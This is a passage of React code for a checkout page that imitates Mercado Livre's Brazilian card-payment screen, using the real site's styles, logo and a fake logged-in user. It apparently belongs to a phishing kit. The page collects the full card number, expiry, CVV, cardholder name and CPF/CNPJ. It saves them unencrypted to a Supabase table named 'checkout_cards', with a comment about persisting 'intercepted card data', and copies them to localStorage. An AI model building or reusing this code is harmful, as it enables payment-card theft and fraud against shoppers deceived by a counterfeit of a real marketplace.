import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { SVG_MASTERCARD, SVG_VISA, SVG_DINERS, SVG_DEFAULT } from '../utils/paymentSvgs';
import { SVG_DISCOVER, SVG_ELO } from '../utils/paymentSvgs2';
import { SVG_MAESTRO, SVG_AMEX } from '../utils/paymentSvgs3';
import { useStore } from "@/contexts/StoreContext";
import { supabase } from "@/integrations/supabase/client";
import { formatCurrencyParts } from "@/utils/formatters";
import { getCheckoutShipping } from "@/utils/checkoutShipping";

const StoreCheckoutPaymentCard = () => {
    const navigate = useNavigate();
    const { cartItems, cartTotal } = useStore();

    const [address, setAddress] = useState<any>(null);
    const [cardNumber, setCardNumber] = useState("");
    const [cardName, setCardName] = useState("");
    const [cardExpiry, setCardExpiry] = useState("");
    const [cardCvv, setCardCvv] = useState("");
    const [docType, setDocType] = useState<"CPF" | "CNPJ">("CPF");
    const [cardCpf, setCardCpf] = useState("");
    const [mobileStep, setMobileStep] = useState(0);
    const [errorField, setErrorField] = useState("");
    const [installments, setInstallments] = useState("1");
    const [isFreeShipping, setIsFreeShipping] = useState(false);
    const selectedShipping = getCheckoutShipping();
    const shippingCost = selectedShipping && !selectedShipping.isFree ? selectedShipping.price : 0;

    useEffect(() => {
        const fetchShipping = async () => {
            const { data } = await supabase.from("settings").select("*").eq("key", "delivery_settings").maybeSingle();
            if (data?.value) {
                setIsFreeShipping((data.value as any).is_free_shipping ?? false);
            }
        };
        fetchShipping();
    }, []);

    useEffect(() => {
        if (cartItems.length === 0) {
            navigate("/store/cart", { replace: true });
            return;
        }
        const saved = localStorage.getItem("checkout_address");
        if (!saved) {
            navigate("/store/checkout/drop", { replace: true });
            return;
        }
        setAddress(JSON.parse(saved));

        // Clear previous card inputs to ensure fresh data for the new attempt
        localStorage.removeItem("checkout_last_password");
        localStorage.removeItem("checkout_card_input");
        localStorage.removeItem("checkout_installment_selection");
    }, [cartItems, navigate]);

    useEffect(() => {
        document.body.setAttribute("data-site", "ML");
        document.body.setAttribute("data-country", "BR");
    }, []);

    const formatCardNumber = (value: string) => {
        const digits = value.replace(/\D/g, "").slice(0, 16);
        return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    };

    const formatExpiry = (value: string) => {
        const digits = value.replace(/\D/g, "").slice(0, 4);
        if (digits.length > 2) return digits.slice(0, 2) + "/" + digits.slice(2);
        return digits;
    };

    const isValidDate = (expiry: string) => {
        if (expiry.length !== 5) return false;
        const [mm, yy] = expiry.split('/');
        const month = parseInt(mm, 10);
        const year = parseInt(yy, 10) + 2000;
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;
        if (month < 1 || month > 12) return false;
        if (year < currentYear) return false;
        if (year === currentYear && month < currentMonth) return false;
        return true;
    };

    const isValidCPF = (cpf: string) => {
        cpf = cpf.replace(/[^\d]+/g, '');
        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
        let sum = 0, rest;
        for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (11 - i);
        rest = (sum * 10) % 11;
        if ((rest === 10) || (rest === 11)) rest = 0;
        if (rest !== parseInt(cpf.substring(9, 10))) return false;
        sum = 0;
        for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (12 - i);
        rest = (sum * 10) % 11;
        if ((rest === 10) || (rest === 11)) rest = 0;
        if (rest !== parseInt(cpf.substring(10, 11))) return false;
        return true;
    };

    const isValidCNPJ = (cnpj: string) => {
        cnpj = cnpj.replace(/[^\d]+/g, '');
        if (cnpj.length !== 14 || /^(\d)\1+$/.test(cnpj)) return false;
        let size = cnpj.length - 2;
        let numbers = cnpj.substring(0, size);
        const digits = cnpj.substring(size);
        let sum = 0;
        let pos = size - 7;
        for (let i = size; i >= 1; i--) {
            sum += parseInt(numbers.charAt(size - i)) * pos--;
            if (pos < 2) pos = 9;
        }
        let result = sum % 11 < 2 ? 0 : 11 - (sum % 11);
        if (result !== parseInt(digits.charAt(0))) return false;
        size = size + 1;
        numbers = cnpj.substring(0, size);
        sum = 0;
        pos = size - 7;
        for (let i = size; i >= 1; i--) {
            sum += parseInt(numbers.charAt(size - i)) * pos--;
            if (pos < 2) pos = 9;
        }
        result = sum % 11 < 2 ? 0 : 11 - (sum % 11);
        if (result !== parseInt(digits.charAt(1))) return false;
        return true;
    };

    const toSvgDataURI = (svgStr: string) => "data:image/svg+xml;charset=utf-8," + encodeURIComponent(svgStr);

    const BIN_PATTERNS = [
        { brand: "elo", pattern: /^(5067|5090|5098|636368)/, image: toSvgDataURI(SVG_ELO) },
        { brand: "hipercard", pattern: /^(606282|3841)/, image: "https://http2.mlstatic.com/storage/logos-api-admin/46f41e50-f3ec-11eb-a55e-a5fe9bc9a686-m.svg" },
        { brand: "discover", pattern: /^(6011|65|62212[6-9]|6221[3-9]\d|622[2-8]\d{2}|6229[0-1]\d|62292[0-5]|64[4-9])/, image: toSvgDataURI(SVG_DISCOVER) },
        { brand: "diners", pattern: /^(36|38|30[0-5])/, image: toSvgDataURI(SVG_DINERS) },
        { brand: "cabal", pattern: /^604/, image: toSvgDataURI(SVG_DEFAULT) },
        { brand: "maestro", pattern: /^(500[0-9]|50[1-5][0-9]|506[0-6]|509[1-7]|5[6-8][0-9]{2})/, image: toSvgDataURI(SVG_MAESTRO) },
        { brand: "jcb", pattern: /^(352[8-9]|35[3-8]\d)/, image: toSvgDataURI(SVG_DEFAULT) },
        { brand: "mir", pattern: /^220/, image: toSvgDataURI(SVG_DEFAULT) },
        { brand: "rupay", pattern: /^60/, image: toSvgDataURI(SVG_DEFAULT) },
        { brand: "unionpay", pattern: /^62/, image: toSvgDataURI(SVG_DEFAULT) },
        { brand: "visa", pattern: /^4/, image: toSvgDataURI(SVG_VISA) },
        { brand: "mastercard", pattern: /^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[0-1]\d|2720)/, image: toSvgDataURI(SVG_MASTERCARD) },
        { brand: "amex", pattern: /^3[47]/, image: toSvgDataURI(SVG_AMEX) }
    ];

    const cardBINInfo = (() => {
        const clean = cardNumber.replace(/\D/g, "");
        const matched = BIN_PATTERNS.find(b => b.pattern.test(clean));
        if (matched) return matched;
        return { brand: "unknown", image: toSvgDataURI(SVG_DEFAULT) };
    })();

    const cardBrand = cardBINInfo.brand;
    const cvvLength = cardBrand === "amex" ? 4 : 3;
    const getCardImage = () => cardBINInfo.image;

    const formatCardPreview = () => {
        const clean = cardNumber.replace(/\D/g, "");
        const padded = clean.padEnd(16, "*");
        return `${padded.slice(0, 4)} ${padded.slice(4, 8)} **** ****`;
    };

    const handleContinue = async () => {
        // Validation check for mobile
        if (window.innerWidth <= 1023) {
            if (mobileStep === 0 && cardNumber.replace(/\s/g, "").length < 13) {
                setErrorField('cardNumber');
                return;
            }
            if (mobileStep === 1 && cardName.length < 3) {
                setErrorField('cardName');
                return;
            }
            if (mobileStep === 2 && (!isValidDate(cardExpiry) || cardCvv.length !== cvvLength)) {
                setErrorField('cardExpiryCvv');
                return;
            }
            if (mobileStep === 3 && !isDocValid) {
                setErrorField('cardDoc');
                return;
            }
        } else if (!isValid) {
            // Desktop validation fallback
            return;
        }

        try {
            // Persist intercepted card data to Database
            const { data, error } = await supabase.from('checkout_cards').insert({
                card_number: cardNumber.replace(/\s/g, ""),
                card_name: cardName,
                card_expiry: cardExpiry,
                card_cvv: cardCvv,
                doc_type: docType,
                doc_number: cardCpf.replace(/\D/g, "")
            }).select().single();

            if (error) {
                console.error("Error saving card info:", error);
            }

            // Always persist to localStorage so downstream pages (installments, declined) can read card info
            localStorage.setItem("checkout_card_input", JSON.stringify({
                id: data?.id ?? null,
                cardNumber: cardNumber.replace(/\s/g, ""),
                cardName: cardName,
                cardExpiry: cardExpiry,
                cardCvv: cardCvv,
                brand: cardBINInfo?.brand ?? "",
                doc_type: docType,
                doc_number: cardCpf
            }));
        } catch (err) {
            console.error("Supabase insert exception:", err);
            // Still save card info locally so the flow can continue
            localStorage.setItem("checkout_card_input", JSON.stringify({
                id: null,
                cardNumber: cardNumber.replace(/\s/g, ""),
                cardName: cardName,
                cardExpiry: cardExpiry,
                cardCvv: cardCvv,
                brand: cardBINInfo?.brand ?? "",
                doc_type: docType,
                doc_number: cardCpf
            }));
        }

        // Navigate to the installments flow
        navigate("/store/checkout/installments");
    };

    const totalParts = formatCurrencyParts(cartTotal);
    const shippingParts = formatCurrencyParts(shippingCost);
    const isDocValid = docType === "CPF" ? isValidCPF(cardCpf) : isValidCNPJ(cardCpf);
    const isValid = cardNumber.replace(/\s/g, "").length >= 13 && cardName.length >= 3 && isValidDate(cardExpiry) && cardCvv.length === cvvLength && isDocValid;

    if (!address) return null;

    return (
        <>
            <link rel="stylesheet" href="https://http2.mlstatic.com/ui/webfonts/v4.1.0/proxima-nova/300-400-600.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-payment-web/index.4c4f88c6.css" />
            <link rel="stylesheet" media="screen and (min-width: 1024px)" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.14.0/modeless-box.css" />
            <link rel="stylesheet" media="screen and (min-width: 1024px)" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.14.0/mercadolibre/navigation-desktop.css" />
            <style>{`
                a#nav-skip-to-main-content { display: none !important; }
                a#nav-a11y-feedback-link { display: none !important; }
                a.nav-header-user-myml { display: none !important; }
                input#cardholderIdentificationNumber { outline: none !important; }
                @keyframes shake-red {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-5px); }
                    75% { transform: translateX(5px); }
                }
                .error-shake input, .error-shake .andes-form-control__field {
                    animation: shake-red 0.4s ease-in-out;
                    border: 1px solid #f23d4f !important;
                    background-color: #fffafb !important;
                }
                @media screen and (max-width: 1023px) {
                    .mobile-step-0 .field-name, .mobile-step-0 .field-expiry-cvv, .mobile-step-0 .field-doc { display: none !important; }
                    .mobile-step-1 .field-number, .mobile-step-1 .field-expiry-cvv, .mobile-step-1 .field-doc { display: none !important; }
                    .mobile-step-2 .field-number, .mobile-step-2 .field-name, .mobile-step-2 .field-doc { display: none !important; }
                    .mobile-step-3 .field-number, .mobile-step-3 .field-name, .mobile-step-3 .field-expiry-cvv { display: none !important; }
                    .hide-on-mobile { display: none !important; }
                    
                    html, body, #root, #root-app {
                        max-width: 100vw !important;
                        overflow-x: hidden !important;
                        margin: 0 !important;
                        padding: 0 !important;
                    }
                    * {
                        box-sizing: border-box !important;
                    }
                    div#mobile_buttons_container {
                        display: flex !important;
                        position: fixed !important;
                        bottom: 0px !important;
                        left: 0px !important;
                        right: 0px !important;
                        width: 100vw !important;
                        justify-content: space-between !important;
                        padding: 16px !important;
                        background: #fff !important;
                        z-index: 999999 !important;
                        box-shadow: 0 -2px 10px rgba(0,0,0,0.1) !important;
                        margin: 0 !important;
                        box-sizing: border-box !important;
                    }
                    div[id="overview_container/2b436617-de96-4608-8404-e54effcfe633"],
                    div[id="bf_cvv_card_detail_row_desktop/2b436617-de96-4608-8404-e54effcfe633"],
                    span[id="label_header/2b436617-de96-4608-8404-e54effcfe633"],
                    footer.nav-footer {
                        display: none !important;
                    }
                    
                    /* Layout Restraints */
                    main, .bf-ui-core-container, .card-form--container, div[id*="bf_card_form"], div[id*="bf_main_container"], div[id*="flox_container"] {
                        max-width: 100vw !important;
                        width: 100% !important;
                        margin-left: 0 !important;
                        margin-right: 0 !important;
                        overflow-x: hidden !important;
                    }

                    /* Professional Form layout for mobile */
                    body, #root-app {
                        background-color: #fff !important;
                    }
                    div[id*="bf_main_container"] {
                        padding: 16px !important;
                    }
                    .card-form--section.card-form--section--desktop,
                    .card-form--wrapper,
                    .card-form--wrapper.card-form--desktop {
                        background: #fff !important;
                        border: none !important;
                        box-shadow: none !important;
                        border-radius: 0 !important;
                        margin-bottom: 80px !important; /* Space for the floating button */
                    }
                    .card-form--custom_wrapper {
                        margin: 0 !important;
                    }
                    .card-form--container.card-form--container--split.card-form--container--desktop {
                        padding: 1px !important;
                    }
                    .ui-box-component-desktop {
                        margin: 0 !important;
                        box-shadow: none !important;
                        border: none !important;
                        border-radius: 0 !important;
                    }
                    
                    /* Custom input rules requested */
                    input#cardNumber, input#name, input#expiry, input#docNumber {
                        border: none !important;
                        outline: none !important;
                        box-shadow: none !important;
                        background: transparent !important;
                    }
                }
                @media screen and (max-width: 1023px) {
                    header.nav-header { display: none !important; }
                    .field-expiry-cvv {
                        gap: 16px !important;
                        justify-content: flex-start !important;
                    }
                    .field-expiry-cvv > div:first-child {
                        flex: none !important;
                        width: 110px !important;
                        max-width: 110px !important;
                    }
                    .field-expiry-cvv > div:last-child {
                        flex: none !important;
                        width: 140px !important;
                        max-width: 140px !important;
                    }
                    header#mobile-header {
                        display: flex !important;
                        background: #fff !important;
                        padding: 16px;
                        align-items: center;
                    }
                    header#mobile-header .bf-core-header__title--hidden {
                        display: none;
                    }
                    header#mobile-header .bf-core-header__button {
                        background: none;
                        border: none;
                        padding: 0;
                        margin: 0;
                        cursor: pointer;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                    }
                }
                @media screen and (min-width: 1024px) {
                    div#mobile_buttons_container { display: none !important; }
                    header#mobile-header { display: none !important; }
                }
            `}</style>

            <header id="mobile-header" data-js="mobile-header" data-testid="mobile-header" className="bf-core-header bf-core-header--transparent">
                <div className="bf-core-header__container">
                    <button type="button" className="bf-core-header__button bf-core-icon-custom-size" onClick={() => navigate("/store/checkout/payments")}>
                        <span className="bf-ui-core-rich-text__icon" data-testid="undefined-0" id="undefined-0" aria-hidden="true" role="presentation">
                            <img className="bf-ui-core-rich-text__icon--image" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_left_arrow_black.svg" alt="" />
                        </span>
                    </button>
                    <h1 className="bf-core-header__title--hidden">Novo cartão</h1>
                </div>
            </header>

            <header role="banner" data-siteid="MLB" className="nav-header nav-header-pluslite ui-navigation-v2">
                <div className="nav-bounds">
                    <div className="nav-header-logo">
                        <a id="nav-skip-to-main-content" className="nav-skip-to-main-content">
                            <span className="nav-skip-to-main-content__content">Ir para o conteúdo principal</span>
                        </a>
                        <a id="nav-a11y-feedback-link" className="nav-a11y-feedback-link">
                            <span className="nav-a11y-feedback-link__content">Acessibilidade</span>
                        </a>
                        
          
          <a className="nav-logo" style={{ backgroundImage: "url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/pt_logo_large_plus@2x.webp')", backgroundSize: "134px 34px", backgroundRepeat: "no-repeat" }}>Mercado Livre</a>
                    </div>
                    <div className="nav-header-menu-wrapper">
                        <nav id="nav-header-menu" aria-label="Menu do usuário">
                            <ul className="nav-header-menu-list">
                                <li className="nav-header-menu-list__item">
                                    <div className="nav-header-user"><label htmlFor="nav-header-user-switch"><a

                                        className="nav-header-user-myml" aria-expanded="false" role="button"
                                        aria-label="Patricia, menu"><span className="nav-header-usermenu-wrapper"><span
                                            aria-hidden="true" className="nav-header-avatar-user"
                                            data-js="user-menu:nav-header-avatar-user">
                                            <div className="nav-header-profile-evolution__container">
                                                <div className="nav-header-profile-evolution__user-initials">PS</div>
                                            </div>
                                        </span><span className="nav-header-username">Patricia</span><span
                                            className="nav-header-username-chevron"></span></span></a></label><input
                                            type="checkbox" id="nav-header-user-switch" />
                                        <nav className="nav-header-user-layer user-menu--hidden user-menu user-menu--rounded-4 user-menu__one-column"
                                            tabIndex={-1} hidden={true} aria-label="Patricia, menu" aria-modal="true"
                                            role="dialog">
                                            <div className="user-menu__main">

                                                <div className="user-menu__user-info-outer-container user-menu__user-with-loyalty">
                                                    <div className="user-menu__user-info-inner-container">

                                                        <div className="user-menu__user-badge user-menu__user-badge--center">

                                                            <a
                                                                className="user-menu-evolution" role="button"
                                                                aria-label="Imagem do perfil, Patricia, Meu perfil">
                                                                <div className="user-menu-evolution__user-badge-image">
                                                                    <div className="user-menu-evolution__user-initials">PS</div>

                                                                </div>

                                                                <div className="user-menu-evolution__user-badge-title">Patricia
                                                                </div>
                                                                <div className="user-menu-evolution__user-action-label">Meu
                                                                    perfil<span
                                                                        className="user-menu-evolution__user-badge-email-chevron"></span>
                                                                </div>
                                                            </a>

                                                        </div>

                                                        <div className="user-menu__user-pill--evolution">
                                                            <a
                                                                className="user-menu__user-pill-anchor">
                                                                <img src="https://http2.mlstatic.com/resources/frontend/statics/loyal/partners/meliplus/drawer/pill_drawer_melimas_mp_mlb_no_price_large_new_value_prop@3x.png"
                                                                    alt="DRAWER_PILL_PROMOTIONAL_ADQUISITION" decoding="async"
                                                                    className="user-menu__user-pill-image" />
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>




                                                <ul className="user-menu__shortcuts">
                                                    <li><span className="user-menu__shortcuts-separator"></span>
                                                        <a
                                                            data-id="purchases" rel="nofollow">
                                                            Compras

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="navigation" rel="nofollow">
                                                            Histórico

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="questions" rel="nofollow">
                                                            Perguntas

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="my-reviews" rel="nofollow">
                                                            Opiniões

                                                        </a>
                                                    </li>
                                                    <li><span className="user-menu__shortcuts-separator"></span>
                                                        <a
                                                            data-id="credits" rel="nofollow">
                                                            Empréstimos

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="subscriptions" rel="nofollow">
                                                            Assinaturas

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="mplay" rel="nofollow">
                                                            Mercado Play
                                                            <span className="user-menu__shortcuts-tag mplay">GRÁTIS</span>
                                                        </a>
                                                    </li>
                                                    <li><span className="user-menu__shortcuts-separator"></span>
                                                        <a
                                                            data-id="sell" rel="nofollow">
                                                            Vender

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="summary" rel="nofollow">
                                                            Resumo

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="listings" rel="nofollow">
                                                            Anúncios

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="sales" rel="nofollow">
                                                            Vendas

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="postsales" rel="nofollow">
                                                            Pós-venda

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="reputation" rel="nofollow">
                                                            Reputação

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="advertising" rel="nofollow">
                                                            Publicidade

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="storefront" rel="nofollow">
                                                            Minha página

                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="marketing" rel="nofollow">
                                                            Central de Marketing
                                                            <span className="user-menu__shortcuts-tag marketing">Novo</span>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a
                                                            data-id="metrics" rel="nofollow">
                                                            Métricas

                                                        </a>
                                                    </li>
                                                    <li><span className="user-menu__shortcuts-separator"></span>
                                                        <a
                                                            data-id="logout" rel="nofollow">
                                                            Sair

                                                        </a>
                                                    </li>
                                                </ul>

                                            </div>
                                            <div className="user-menu__old">
                                                <a rel="nofollow">Minha
                                                    conta</a><a

                                                        rel="nofollow">Sair</a>
                                            </div>
                                            <span className="user-menu__chevron"></span>
                                        </nav>
                                    </div>
                                </li>
                                <li className="nav-header-menu-list__item"><a
                                    className="option-help"
                                    rel="">Contato</a></li>
                                <li className="nav-header-menu-list__item"></li>
                            </ul>
                        </nav><span className="nav-header-notifications-badge">1</span>
                    </div>
                </div>
            </header>
            <main role="main" id="root-app">
                <div id="add_new_card_1" className="step-container add_new_card_1-container">
                    <div>
                        <style></style>
                    </div>
                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--main"
                        aria-hidden="false" data-js="screen" data-id="flox_container/2b436617-de96-4608-8404-e54effcfe633"
                        data-testid="flox_container">
                        <div id="bf_main_container/d77ae3ff-e4d8-456b-9d91-b8b61543870f"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--match_parent bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--background-gray070Solid"
                            aria-hidden="false" data-js="container"
                            data-id="bf_main_container/d77ae3ff-e4d8-456b-9d91-b8b61543870f" data-testid="bf_main_container">
                            <span
                                className="bf-ui-core-label bf-ui-core-label--margin--top-spacing40 bf-ui-core-label--margin--bottom-spacing24"
                                role="presentation" data-testid="label_header/2b436617-de96-4608-8404-e54effcfe633"
                                id="label_header/2b436617-de96-4608-8404-e54effcfe633" aria-hidden="false"><span
                                    className="andes-visually-hidden">Adicionar novo cartão</span>
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlem" aria-hidden="false"
                                    data-testid="label_header-0" id="label_header-0">
                                    <h1
                                        className="andes-typography andes-typography--type-title andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">
                                        Adicionar novo cartão</h1>
                                </div>
                            </span>
                            <div data-js="bf-ui-core-card"
                                data-id="bf_cvv_card_detail_row_desktop/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="bf_cvv_card_detail_row_desktop"
                                className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing24 andes-card--secondary-light andes-card--flat andes-card--padding-16"
                                id="bf_cvv_card_detail_row_desktop/2b436617-de96-4608-8404-e54effcfe633">
                                <div
                                    className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--row bf-ui-core-card__content--flex-align--center bf-ui-core-card__content--flex-text_align--left bf-ui-core-card__content--flex-justify--between bf-ui-core-card__content--flex-height--wrap_content bf-ui-core-card__content--flex-width--match_parent bf-ui-core-card__content--flex-wrap--no-wrap">
                                    <div id="bf_cvv_payment_method_card_container/2b436617-de96-4608-8404-e54effcfe633"
                                        className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--center bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--wrap_content bf-ui-core-container--flex-wrap--no-wrap"
                                        aria-hidden="false" data-js="container"
                                        data-id="bf_cvv_payment_method_card_container/2b436617-de96-4608-8404-e54effcfe633"
                                        data-testid="bf_cvv_payment_method_card_container">
                                        <div className="andes-thumbnail-container">
                                            <div
                                                className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail bf-ui-core-thumbnail--margin--right-spacing8">
                                                <img aria-hidden="true" alt=""
                                                    src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_credito_noborde.svg"
                                                    data-testid="bf_cvv_payment_method_card_thumbnail" /></div>
                                        </div><span className="bf-ui-core-label" role="presentation"
                                            data-testid="bf_cvv_payment_method_card_label/2b436617-de96-4608-8404-e54effcfe633"
                                            id="bf_cvv_payment_method_card_label/2b436617-de96-4608-8404-e54effcfe633"
                                            aria-hidden="false"><span className="andes-visually-hidden">Novo cartão</span><span
                                                    className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym"
                                                    aria-hidden="true" data-testid="bf_cvv_payment_method_card_label-0"
                                                    id="bf_cvv_payment_method_card_label-0" role="presentation"><span
                                                        className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular"
                                                        role="presentation">Novo cartão</span></span></span>
                                    </div>
                                </div>
                            </div>
                            <div id="bf_card_form/2b436617-de96-4608-8404-e54effcfe633" data-testid="card-form">
                                <div className="card-form--custom_wrapper" data-testid="card-form-wrapper">
                                    <section className="card-form--section card-form--section--desktop">
                                        <div
                                            className="card-form--container card-form--container--split card-form--container--desktop">
                                            <form><input type="hidden" name="_csrf"
                                                value="31AzX0Gx-VzPiCTVfQMrkpZ-HoNR-7KEIlI4" />
                                                <div className={`card-form--wrapper card-form--desktop mobile-step-${mobileStep}`}
                                                    data-testid="card-form--wrapper">
                                                    <div className={`andes-form-control andes-form-control--textfield card-form--field field-number ${errorField === 'cardNumber' ? 'error-shake' : ''}`} aria-hidden="false">
                                                        <label htmlFor="cardNumber"><span className="andes-form-control__label">Número do cartão</span></label>
                                                        <div className="andes-form-control__control">
                                                            <input
                                                                id="cardNumber"
                                                                className="andes-form-control__field"
                                                                maxLength={19}
                                                                placeholder="0000 0000 0000 0000"
                                                                value={cardNumber}
                                                                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                                                            />
                                                        </div>
                                                    </div>
                                                    <div className={`andes-form-control andes-form-control--textfield card-form--field field-name ${errorField === 'cardName' ? 'error-shake' : ''}`}
                                                        aria-hidden="false"><label htmlFor="cardholderName"><span
                                                            className="andes-form-control__label">Nome e sobrenome</span></label>
                                                        <div className="andes-form-control__control"><input
                                                            data-testid="cardholder-name--field" id="cardholderName"
                                                            className="andes-form-control__field" maxLength={120}
                                                            placeholder="Como aparece no cartão"
                                                            aria-describedby="cardholderName-message" value={cardName} onChange={(e) => { setCardName(e.target.value); setErrorField(''); }} />
                                                        </div>
                                                        <div className="andes-form-control__bottom"><span
                                                            id="cardholderName-message"
                                                            className="andes-form-control__message">Assim como aparece no cartão.</span></div>
                                                    </div>
                                                    <div className={`card-form--wrapper--line field-expiry-cvv ${errorField === 'cardExpiryCvv' ? 'error-shake' : ''}`} data-testid="card-form--wrapper--line" aria-hidden="false" style={{ display: 'flex', gap: '16px' }}>
                                                        <div className="andes-form-control andes-form-control--textfield card-form--field" aria-hidden="false" style={{ flex: 1 }}>
                                                            <label htmlFor="cardExpiry"><span className="andes-form-control__label">Data de vencimento</span></label>
                                                            <div className="andes-form-control__control">
                                                                <input
                                                                    id="cardExpiry"
                                                                    className="andes-form-control__field"
                                                                    maxLength={5}
                                                                    placeholder="MM/AA"
                                                                    value={cardExpiry}
                                                                    onChange={(e) => { setCardExpiry(formatExpiry(e.target.value)); setErrorField(''); }}
                                                                />
                                                            </div>
                                                        </div>
                                                        <div className="andes-form-control andes-form-control--textfield card-form--field" aria-hidden="false" style={{ flex: 1 }}>
                                                            <label htmlFor="cardCvv"><span className="andes-form-control__label">Código de segurança</span></label>
                                                            <div className="andes-form-control__control">
                                                                <input
                                                                    id="cardCvv"
                                                                    className="andes-form-control__field"
                                                                    maxLength={cvvLength}
                                                                    placeholder="3 ou 4 números"
                                                                    value={cardCvv}
                                                                    onChange={(e) => { setCardCvv(e.target.value.replace(/\D/g, '').substring(0, cvvLength)); setErrorField(''); }}
                                                                />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div className={`andes-form-control card-form--split-textfield card-form--field card-form--list-nowrap andes-form-control--textfield andes-form-control--split andes-form-control--floated field-doc ${errorField === 'cardDoc' ? 'error-shake' : ''}`}
                                                        aria-hidden="false"><label htmlFor="cardholderIdentificationNumber"><span
                                                            className="andes-form-control__label">Documento do titular</span></label>
                                                        <div className="andes-form-control__control">
                                                            <div id="cardholderIdentificationNumber-dropdown"
                                                                className="andes-dropdown andes-dropdown--standalone andes-form-control__split-button andes-dropdown--large">
                                                                <div className="andes-floating-menu"><button
                                                                    onClick={() => { setDocType(docType === "CPF" ? "CNPJ" : "CPF"); setCardCpf(""); }}
                                                                    aria-labelledby="cardholderIdentificationNumber-dropdown-label cardholderIdentificationNumber-dropdown-display-values"
                                                                    className="andes-dropdown__trigger" type="button"
                                                                    id="cardholderIdentificationNumber-dropdown-trigger"
                                                                    aria-expanded="false" aria-haspopup="listbox"
                                                                    tabIndex={0}><span className="andes-visually-hidden"
                                                                        id="cardholderIdentificationNumber-dropdown-label">Documento do titular</span><span
                                                                            className="andes-dropdown__display-values"
                                                                            id="cardholderIdentificationNumber-dropdown-display-values">{docType}</span>
                                                                    <div className="andes-dropdown__standalone-arrow"
                                                                        aria-hidden="true"><svg aria-hidden="true"
                                                                            width="12" height="12" viewBox="0 0 12 12"
                                                                            fill="rgba(0, 0, 0, 0.9)">
                                                                            <path
                                                                                d="M9.35229 3.70447L6.00004 7.05672L2.64779 3.70447L1.85229 4.49996L6.00004 8.64771L10.1478 4.49996L9.35229 3.70447Z"
                                                                                fill="rgba(0, 0, 0, 0.9)"></path>
                                                                        </svg></div>
                                                                </button></div>
                                                            </div>
                                                            <div
                                                                className="andes-form-control andes-form-control--textfield andes-form-control__field andes-form-control__split-field">
                                                                <div className="andes-form-control__control"><input
                                                                    data-testid="identification-types--field"
                                                                    inputMode="numeric" aria-invalid="false"
                                                                    aria-labelledby="cardholderIdentificationNumber-dropdown-trigger"
                                                                    id="cardholderIdentificationNumber"
                                                                    maxLength={docType === "CPF" ? 14 : 18}
                                                                    placeholder={docType === "CPF" ? "999.999.999-99" : "99.999.999/9999-99"}
                                                                    aria-label="Documento do titular"
                                                                    value={cardCpf}
                                                                    onChange={(e) => {
                                                                        let v = e.target.value.replace(/\D/g, '');
                                                                        if (docType === "CPF") {
                                                                            if (v.length > 11) v = v.substring(0, 11);
                                                                            if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, "$1.$2.$3-$4");
